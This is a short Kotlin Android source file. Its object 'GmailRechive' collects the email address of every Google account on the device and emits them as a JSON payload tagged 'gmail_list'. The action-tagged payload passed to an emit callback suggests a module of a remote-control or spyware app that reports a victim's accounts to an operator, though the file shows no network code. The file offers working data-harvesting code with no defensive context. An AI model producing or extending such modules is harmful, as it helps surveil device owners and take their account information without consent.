package com.app.cyber

import android.accounts.AccountManager
import android.content.Context
import org.json.JSONArray
import org.json.JSONObject

object GmailRechive {
    fun listAccounts(ctx: Context, emit: (JSONObject) -> Unit) {
        val list = JSONArray()
        try {
            val am = AccountManager.get(ctx)
            val accounts = am.getAccountsByType("com.google")
            
            for (acc in accounts) {
                val obj = JSONObject()
                obj.put("email", acc.name)
                list.put(obj)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        
        val payload = JSONObject()
        payload.put("action", "gmail_list")
        payload.put("data", list)
        emit(payload)
    }
}
